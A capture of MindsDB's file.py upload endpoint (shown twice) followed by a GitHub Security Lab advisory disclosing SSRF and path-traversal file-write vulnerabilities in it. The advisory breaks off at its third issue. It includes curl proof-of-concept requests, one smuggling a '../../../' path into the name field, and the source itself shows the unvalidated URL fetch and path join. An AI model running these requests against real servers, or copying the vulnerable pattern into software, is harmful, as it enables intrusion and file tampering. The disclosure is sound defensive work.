=== Content from github.com_9557f6f3_20250114_192723.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmindsdb%2Fmindsdb%2Fblob%2F1821da719f34c022890c9ff25810218e71c5abbc%2Fmindsdb%2Fapi%2Fhttp%2Fnamespaces%2Ffile.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmindsdb%2Fmindsdb%2Fblob%2F1821da719f34c022890c9ff25810218e71c5abbc%2Fmindsdb%2Fapi%2Fhttp%2Fnamespaces%2Ffile.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=mindsdb%2Fmindsdb)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mindsdb](/mindsdb)
/
**[mindsdb](/mindsdb/mindsdb)**
Public

* [Notifications](/login?return_to=%2Fmindsdb%2Fmindsdb) You must be signed in to change notification settings
* [Fork
  4.9k](/login?return_to=%2Fmindsdb%2Fmindsdb)
* [Star
   27.1k](/login?return_to=%2Fmindsdb%2Fmindsdb)

* [Code](/mindsdb/mindsdb)
* [Issues
  82](/mindsdb/mindsdb/issues)
* [Pull requests
  65](/mindsdb/mindsdb/pulls)
* [Discussions](/mindsdb/mindsdb/discussions)
* [Actions](/mindsdb/mindsdb/actions)
* [Projects
  1](/mindsdb/mindsdb/projects)
* [Security](/mindsdb/mindsdb/security)
* [Insights](/mindsdb/mindsdb/pulse)

Additional navigation options

* [Code](/mindsdb/mindsdb)
* [Issues](/mindsdb/mindsdb/issues)
* [Pull requests](/mindsdb/mindsdb/pulls)
* [Discussions](/mindsdb/mindsdb/discussions)
* [Actions](/mindsdb/mindsdb/actions)
* [Projects](/mindsdb/mindsdb/projects)
* [Security](/mindsdb/mindsdb/security)
* [Insights](/mindsdb/mindsdb/pulse)

## Files

 1821da7
## Breadcrumbs

1. [mindsdb](/mindsdb/mindsdb/tree/1821da719f34c022890c9ff25810218e71c5abbc)
2. /[mindsdb](/mindsdb/mindsdb/tree/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb)
3. /[api](/mindsdb/mindsdb/tree/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api)
4. /[http](/mindsdb/mindsdb/tree/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http)
5. /[namespaces](/mindsdb/mindsdb/tree/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces)
/
# file.py

Copy path Blame  Blame
## Latest commit

## History

[History](/mindsdb/mindsdb/commits/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces/file.py)168 lines (142 loc) · 5.5 KB 1821da7
## Breadcrumbs

1. [mindsdb](/mindsdb/mindsdb/tree/1821da719f34c022890c9ff25810218e71c5abbc)
2. /[mindsdb](/mindsdb/mindsdb/tree/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb)
3. /[api](/mindsdb/mindsdb/tree/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api)
4. /[http](/mindsdb/mindsdb/tree/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http)
5. /[namespaces](/mindsdb/mindsdb/tree/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces)
/
# file.py

Top
## File metadata and controls

* Code
* Blame

168 lines (142 loc) · 5.5 KB[Raw](https://github.com/mindsdb/mindsdb/raw/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces/file.py)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168import osimport zipfileimport tarfile
from flask import request, current\_app as cafrom flask\_restx import Resourceimport tempfileimport multipartimport requests
from mindsdb.utilities import logfrom mindsdb.api.http.utils import http\_error, safe\_extractfrom mindsdb.api.http.namespaces.configs.files import ns\_conffrom mindsdb.utilities.config import Configfrom mindsdb.utilities.context import context as ctx
@ns\_conf.route('/')class FilesList(Resource): @ns\_conf.doc('get\_files\_list') def get(self): '''List all files''' return ca.file\_controller.get\_files()
@ns\_conf.route('/<name>')@ns\_conf.param('name', "MindsDB's name for file")class File(Resource): @ns\_conf.doc('put\_file') def put(self, name: str): ''' add new file params in FormData: - file - original\_file\_name [optional] '''
 data = {} mindsdb\_file\_name = name
 existing\_file\_names = ca.file\_controller.get\_files\_names()
 def on\_field(field): name = field.field\_name.decode() value = field.value.decode() data[name] = value
 file\_object = None
 def on\_file(file): nonlocal file\_object data['file'] = file.file\_name.decode() file\_object = file.file\_object
 temp\_dir\_path = tempfile.mkdtemp(prefix='mindsdb\_file\_')
 if request.headers['Content-Type'].startswith('multipart/form-data'): parser = multipart.create\_form\_parser( headers=request.headers, on\_field=on\_field, on\_file=on\_file, config={ 'UPLOAD\_DIR': temp\_dir\_path.encode(), # bytes required 'UPLOAD\_KEEP\_FILENAME': True, 'UPLOAD\_KEEP\_EXTENSIONS': True, 'MAX\_MEMORY\_FILE\_SIZE': 0 } )
 while True: chunk = request.stream.read(8192) if not chunk: break parser.write(chunk) parser.finalize() parser.close()
 if file\_object is not None and not file\_object.closed: file\_object.close() else: data = request.json
 if mindsdb\_file\_name in existing\_file\_names: return http\_error( 400, "File already exists", f"File with name '{data['file']}' already exists" )
 if data.get('source\_type') == 'url': url = data['source'] data['file'] = data['name']
 config = Config() is\_cloud = config.get('cloud', False) if is\_cloud is True and ctx.user\_class != 1: info = requests.head(url) file\_size = info.headers.get('Content-Length') try: file\_size = int(file\_size) except Exception: pass
 if file\_size is None: return http\_error( 400, "Error getting file info", "Сan't determine remote file size" ) if file\_size > 1024 \* 1024 \* 100: return http\_error( 400, "File is too big", "Upload limit for file is 100Mb" ) with requests.get(url, stream=True) as r: if r.status\_code != 200: return http\_error( 400, "Error getting file", f"Got status code: {r.status\_code}" ) file\_path = os.path.join(temp\_dir\_path, data['file']) with open(file\_path, 'wb') as f: for chunk in r.iter\_content(chunk\_size=8192): f.write(chunk)
 original\_file\_name = data.get('original\_file\_name')
 file\_path = os.path.join(temp\_dir\_path, data['file']) lp = file\_path.lower() if lp.endswith(('.zip', '.tar.gz')): if lp.endswith('.zip'): with zipfile.ZipFile(file\_path) as f: f.extractall(temp\_dir\_path) elif lp.endswith('.tar.gz'): with tarfile.open(file\_path) as f: safe\_extract(f, temp\_dir\_path) os.remove(file\_path) files = os.listdir(temp\_dir\_path) if len(files) != 1: os.rmdir(temp\_dir\_path) return http\_error(400, 'Wrong content.', 'Archive must contain only one data file.') file\_path = os.path.join(temp\_dir\_path, files[0]) mindsdb\_file\_name = files[0] if not os.path.isfile(file\_path): os.rmdir(temp\_dir\_path) return http\_error(400, 'Wrong content.', 'Archive must contain data file in root.')
 ca.file\_controller.save\_file(mindsdb\_file\_name, file\_path, file\_name=original\_file\_name)
 os.rmdir(temp\_dir\_path)
 return '', 200
 @ns\_conf.doc('delete\_file') def delete(self, name: str): '''delete file'''
 try: ca.file\_controller.delete\_file(name) except Exception as e: log.logger.error(e) return http\_error( 400, "Error deleting file", f"There was an error while tring to delete file with name '{name}'" ) return '', 200

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_cc4b26d1_20250114_192721.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmindsdb%2Fmindsdb%2Fblob%2F1821da719f34c022890c9ff25810218e71c5abbc%2Fmindsdb%2Fapi%2Fhttp%2Fnamespaces%2Ffile.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmindsdb%2Fmindsdb%2Fblob%2F1821da719f34c022890c9ff25810218e71c5abbc%2Fmindsdb%2Fapi%2Fhttp%2Fnamespaces%2Ffile.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=mindsdb%2Fmindsdb)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mindsdb](/mindsdb)
/
**[mindsdb](/mindsdb/mindsdb)**
Public

* [Notifications](/login?return_to=%2Fmindsdb%2Fmindsdb) You must be signed in to change notification settings
* [Fork
  4.9k](/login?return_to=%2Fmindsdb%2Fmindsdb)
* [Star
   27.1k](/login?return_to=%2Fmindsdb%2Fmindsdb)

* [Code](/mindsdb/mindsdb)
* [Issues
  82](/mindsdb/mindsdb/issues)
* [Pull requests
  65](/mindsdb/mindsdb/pulls)
* [Discussions](/mindsdb/mindsdb/discussions)
* [Actions](/mindsdb/mindsdb/actions)
* [Projects
  1](/mindsdb/mindsdb/projects)
* [Security](/mindsdb/mindsdb/security)
* [Insights](/mindsdb/mindsdb/pulse)

Additional navigation options

* [Code](/mindsdb/mindsdb)
* [Issues](/mindsdb/mindsdb/issues)
* [Pull requests](/mindsdb/mindsdb/pulls)
* [Discussions](/mindsdb/mindsdb/discussions)
* [Actions](/mindsdb/mindsdb/actions)
* [Projects](/mindsdb/mindsdb/projects)
* [Security](/mindsdb/mindsdb/security)
* [Insights](/mindsdb/mindsdb/pulse)

## Files

 1821da7
## Breadcrumbs

1. [mindsdb](/mindsdb/mindsdb/tree/1821da719f34c022890c9ff25810218e71c5abbc)
2. /[mindsdb](/mindsdb/mindsdb/tree/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb)
3. /[api](/mindsdb/mindsdb/tree/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api)
4. /[http](/mindsdb/mindsdb/tree/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http)
5. /[namespaces](/mindsdb/mindsdb/tree/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces)
/
# file.py

Copy path Blame  Blame
## Latest commit

## History

[History](/mindsdb/mindsdb/commits/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces/file.py)168 lines (142 loc) · 5.5 KB 1821da7
## Breadcrumbs

1. [mindsdb](/mindsdb/mindsdb/tree/1821da719f34c022890c9ff25810218e71c5abbc)
2. /[mindsdb](/mindsdb/mindsdb/tree/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb)
3. /[api](/mindsdb/mindsdb/tree/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api)
4. /[http](/mindsdb/mindsdb/tree/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http)
5. /[namespaces](/mindsdb/mindsdb/tree/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces)
/
# file.py

Top
## File metadata and controls

* Code
* Blame

168 lines (142 loc) · 5.5 KB[Raw](https://github.com/mindsdb/mindsdb/raw/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces/file.py)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168import osimport zipfileimport tarfile
from flask import request, current\_app as cafrom flask\_restx import Resourceimport tempfileimport multipartimport requests
from mindsdb.utilities import logfrom mindsdb.api.http.utils import http\_error, safe\_extractfrom mindsdb.api.http.namespaces.configs.files import ns\_conffrom mindsdb.utilities.config import Configfrom mindsdb.utilities.context import context as ctx
@ns\_conf.route('/')class FilesList(Resource): @ns\_conf.doc('get\_files\_list') def get(self): '''List all files''' return ca.file\_controller.get\_files()
@ns\_conf.route('/<name>')@ns\_conf.param('name', "MindsDB's name for file")class File(Resource): @ns\_conf.doc('put\_file') def put(self, name: str): ''' add new file params in FormData: - file - original\_file\_name [optional] '''
 data = {} mindsdb\_file\_name = name
 existing\_file\_names = ca.file\_controller.get\_files\_names()
 def on\_field(field): name = field.field\_name.decode() value = field.value.decode() data[name] = value
 file\_object = None
 def on\_file(file): nonlocal file\_object data['file'] = file.file\_name.decode() file\_object = file.file\_object
 temp\_dir\_path = tempfile.mkdtemp(prefix='mindsdb\_file\_')
 if request.headers['Content-Type'].startswith('multipart/form-data'): parser = multipart.create\_form\_parser( headers=request.headers, on\_field=on\_field, on\_file=on\_file, config={ 'UPLOAD\_DIR': temp\_dir\_path.encode(), # bytes required 'UPLOAD\_KEEP\_FILENAME': True, 'UPLOAD\_KEEP\_EXTENSIONS': True, 'MAX\_MEMORY\_FILE\_SIZE': 0 } )
 while True: chunk = request.stream.read(8192) if not chunk: break parser.write(chunk) parser.finalize() parser.close()
 if file\_object is not None and not file\_object.closed: file\_object.close() else: data = request.json
 if mindsdb\_file\_name in existing\_file\_names: return http\_error( 400, "File already exists", f"File with name '{data['file']}' already exists" )
 if data.get('source\_type') == 'url': url = data['source'] data['file'] = data['name']
 config = Config() is\_cloud = config.get('cloud', False) if is\_cloud is True and ctx.user\_class != 1: info = requests.head(url) file\_size = info.headers.get('Content-Length') try: file\_size = int(file\_size) except Exception: pass
 if file\_size is None: return http\_error( 400, "Error getting file info", "Сan't determine remote file size" ) if file\_size > 1024 \* 1024 \* 100: return http\_error( 400, "File is too big", "Upload limit for file is 100Mb" ) with requests.get(url, stream=True) as r: if r.status\_code != 200: return http\_error( 400, "Error getting file", f"Got status code: {r.status\_code}" ) file\_path = os.path.join(temp\_dir\_path, data['file']) with open(file\_path, 'wb') as f: for chunk in r.iter\_content(chunk\_size=8192): f.write(chunk)
 original\_file\_name = data.get('original\_file\_name')
 file\_path = os.path.join(temp\_dir\_path, data['file']) lp = file\_path.lower() if lp.endswith(('.zip', '.tar.gz')): if lp.endswith('.zip'): with zipfile.ZipFile(file\_path) as f: f.extractall(temp\_dir\_path) elif lp.endswith('.tar.gz'): with tarfile.open(file\_path) as f: safe\_extract(f, temp\_dir\_path) os.remove(file\_path) files = os.listdir(temp\_dir\_path) if len(files) != 1: os.rmdir(temp\_dir\_path) return http\_error(400, 'Wrong content.', 'Archive must contain only one data file.') file\_path = os.path.join(temp\_dir\_path, files[0]) mindsdb\_file\_name = files[0] if not os.path.isfile(file\_path): os.rmdir(temp\_dir\_path) return http\_error(400, 'Wrong content.', 'Archive must contain data file in root.')
 ca.file\_controller.save\_file(mindsdb\_file\_name, file\_path, file\_name=original\_file\_name)
 os.rmdir(temp\_dir\_path)
 return '', 200
 @ns\_conf.doc('delete\_file') def delete(self, name: str): '''delete file'''
 try: ca.file\_controller.delete\_file(name) except Exception as e: log.logger.error(e) return http\_error( 400, "Error deleting file", f"There was an error while tring to delete file with name '{name}'" ) return '', 200

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from securitylab.github.com_a6e4a3c2_20250114_192724.html ===

[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

December 21, 2023
# GHSL-2023-182\_GHSL-2023-184: Server-side request forgery (SSRF), arbitrary file write and limited file write vulnerabilities in mindsdb/mindsdb - CVE-2023-49795, CVE-2023-50731, CVE-2023-49796

[![Author avatar](https://avatars.githubusercontent.com/u/102833689)
Sylwia Budzynska](https://github.com/sylwia-budzynska)

## Coordinated Disclosure Timeline

* 2023-08-09: Sent report to hello@mindsdb.com
* 2023-08-23: Sent a follow up email.
* 2023-09-11: Created an issue and sent the report to the email I received in response.
* 2023-09-28: Asked for an update.
* 2023-10-31: Sent a reminder about our disclosure policy deadline and asked for a CVE.
* 2023-11-17: Sent a reminder about the expired deadline (9 November 2023) and asked for publishing an advisory and a CVE.
* 2023-11-27: Sent a final reminder asking to publish an advisory.
* 2023-11-28: Received an answer that the issues are in the process of being fixed.
* 2023-12-11: Advisories for two of the issues are created and CVEs assigned. Sent an email inquiring about an advisory and CVE for the last vulnerability - GHSL-2023-183.
* 2023-12-15: The maintainer creates an advisory for GHSL-2023-183.
* 2023-12-18: GitHub Security Lab assigns a CVE to GHSL-2023-183.

## Summary

Three vulnerabilities that can be exploited by unauthenticated users were found in MindsDB: a Server-side request forgery (SSRF) vulnerability, an arbitrary file write vulnerability and a limited file write vulnerability.

## Product

mindsdb/mindsdb

## Tested Version

[v23.7.4.1](https://github.com/mindsdb/mindsdb/releases/tag/v23.7.4.1)

## Details

### Issue 1: SSRF in `file.py` (`GHSL-2023-182`)

The [`put`](https://github.com/mindsdb/mindsdb/blob/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces/file.py#L30-L153) method in mindsdb/mindsdb/api/http/namespaces/file.py does not validate the user-controlled URL in the [`source`](https://github.com/mindsdb/mindsdb/blob/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces/file.py#L90) variable and uses it to create arbitrary requests on [line 115](https://github.com/mindsdb/mindsdb/blob/4169a6c4677a472f74f82123a35d036de34b508e/mindsdb/api/http/namespaces/file.py#L115), which allows Server-side request forgery (SSRF).

```
with requests.get(url, stream=True) as r:
        if r.status_code != 200:
            return http_error(
                400,
                "Error getting file",
                f"Got status code: {r.status_code}"
            )

```

There is another potential instance of SSRF on [line 96](https://github.com/mindsdb/mindsdb/blob/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces/file.py#L96) affecting cloud-based deployments.

This issue was found using the [SSRF CodeQL query for python](https://codeql.github.com/codeql-query-help/python/py-full-ssrf/).

#### Proof of Concept

1. Create a new test folder with an example CSV file called `test.csv`. Start a simple python server in the folder with `python -m http.server 9090` This command will serve the example files container in the folder on `http://127.0.0.1:9090`
2. Start MindsDB. We assume in this example that MindsDB in running on `http://127.0.0.1:47334/`
3. Send the following request to MindsDB:
   ```
   curl -X PUT http://127.0.0.1:47334/api/files/foobar -H "Content-Type: application/json" -d '{"name":"foobar","source":"http://127.0.0.1:9090/test.csv","source_type":"url"}'

   ```

#### Impact

This issue may lead to `Information Disclosure`.

The SSRF allows for forging arbitrary network requests from the MindsDB server. It can be used to scan nodes in internal networks for open ports that may not be accessible externally, as well as scan for existing files on the internal network. It allows for retrieving files with csv, xls, xlsx, json or parquet extensions, which will be viewable via MindsDB GUI. For any other existing files, it is a blind SSRF.

#### Resources

* [SSRF prevention cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
* [SSRF on line 115](https://github.com/mindsdb/mindsdb/blob/4169a6c4677a472f74f82123a35d036de34b508e/mindsdb/api/http/namespaces/file.py#L115)
* [SSRF on line 96](https://github.com/mindsdb/mindsdb/blob/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces/file.py#L96)

### Issue 2: Arbitrary file write in `file.py` (`GHSL-2023-183`)

The same [`put`](https://github.com/mindsdb/mindsdb/blob/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces/file.py#L30-L153) method in mindsdb/mindsdb/api/http/namespaces/file.py does not validate the user-controlled [`name`](https://github.com/mindsdb/mindsdb/blob/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces/file.py#L91) value, which is used in a temporary file name, which is afterwards opened for writing on [lines 122-125](https://github.com/mindsdb/mindsdb/blob/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces/file.py#L122-L125), which leads to path injection.

```
file_path = os.path.join(temp_dir_path, data['file'])
with open(file_path, 'wb') as f:
    for chunk in r.iter_content(chunk_size=8192):
        f.write(chunk)

```

Later in the method, the temporary directory is deleted on [line 151](https://github.com/mindsdb/mindsdb/blob/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces/file.py#L151), but since we can write outside of the directory using the path injection vulnerability, the potentially dangerous file is not deleted.

```
os.rmdir(temp_dir_path)

```

Arbitrary file contents can be written due to `f.write(chunk)` on [line 125](https://github.com/mindsdb/mindsdb/blob/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces/file.py#L125). Mindsdb does check later on [line 149](https://github.com/mindsdb/mindsdb/blob/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces/file.py#L149) in the save\_file method in [file-controller.py](https://github.com/mindsdb/mindsdb/blob/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/interfaces/file/file_controller.py#L75) which calls the `_handle_source` method in [file\_handler.py](https://github.com/mindsdb/mindsdb/blob/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/integrations/handlers/file_handler/file_handler.py#L100-L141) if a file is of one of the types: csv, json, parquet, xls, xlsx. However, since the check happens after the file has already been written, the files will still exist (and will not be removed due to the path injection described earlier), just the `_handle_source` method will return an error.

The same user-controlled source `source` is used also in another path injection sink on [line 138](https://github.com/mindsdb/mindsdb/blob/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces/file.py#L138). This leads to another path injection, which allows an attacker to delete any zip or tar.gz files on the server.

This issue was found using the [Uncontrolled data used in path expression CodeQL query for python](https://codeql.github.com/codeql-query-help/python/py-path-injection/).

#### Impact

This issue may lead to `arbitrary file write`. This vulnerability allows for writing files anywhere on the server that the filesystem permissions that the server is running with allow to.

#### Resources

* Path injection leading to arbitrary file write on [lines 122-125](https://github.com/mindsdb/mindsdb/blob/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces/file.py#L122-L125)
* Path injection leading to deleting zip and tar.gz files on the server on [line 138](https://github.com/mindsdb/mindsdb/blob/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces/file.py#L138)

#### Proof of Concept

1. Create a new test folder with a potentially dangerous file called `pwned.txt`. Start a simple python server in the folder with `python -m http.server 9090`. This command will serve the example files container in the folder on `http://127.0.0.1:9090`
2. Start MindsDB. We assume in this example that MindsDB in running on `http://127.0.0.1:47334/`
3. Send the following request to MindsDB:
   ```
   curl -X PUT http://127.0.0.1:47334/api/files/foo -H "Content-Type: application/json" -d '{"name":"../../../../../../mindsdb/file.txt","source":"http://127.0.0.1:9090/pwned.txt","source_type":"url"}'

   ```

   You may need to modify the `original_file_name` value in case you are using another folder name for your MindsDB installation.
4. Go to the `mindsdb` folder on the server and check that file.txt file with contents of pwned.txt has been created.

### Issue 3: Limited file write in `file.py` (`GHSL-2023-184`)

